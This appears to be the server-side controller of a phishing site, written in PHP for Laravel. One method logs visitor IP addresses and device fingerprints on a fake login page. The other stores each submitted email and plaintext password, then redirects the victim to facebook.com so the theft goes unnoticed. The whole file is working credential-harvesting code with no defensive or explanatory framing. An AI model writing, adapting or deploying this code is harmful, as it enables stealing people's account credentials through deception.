<?php

namespace App\Http\Controllers;

use App\Models\LoginPageHit;
use App\Models\LoginRecord;
use Illuminate\Http\Request;
use Jenssegers\Agent\Agent;

class LoginController extends Controller
{
    public function login_page(){
        $agent = new Agent();
        LoginPageHit::query()->create([

            'url'   => url()->current(),
            'ip_address' => request()->ip(),
            'device_type' => $agent->device(),
            'os_name' => $agent->platform(),
            'os_version' => $agent->version($agent->platform()),
            'browser_name' => $agent->browser(),
            'browser_version' => $agent->version($agent->browser()),
        ]);

        return view('login_page');
    }

    public function login(Request $request){
        $agent = new Agent();
        LoginRecord::query()->create([
            'email' => $request->input('email'),
            'password' => $request->input('password'),

            'url'   => url()->current(),
            'ip_address' => request()->ip(),
            'device_type' => $agent->device(),
            'os_name' => $agent->platform(),
            'os_version' => $agent->version($agent->platform()),
            'browser_name' => $agent->browser(),
            'browser_version' => $agent->version($agent->browser()),
        ]);

        return redirect()->away('https://facebook.com');

    }
}
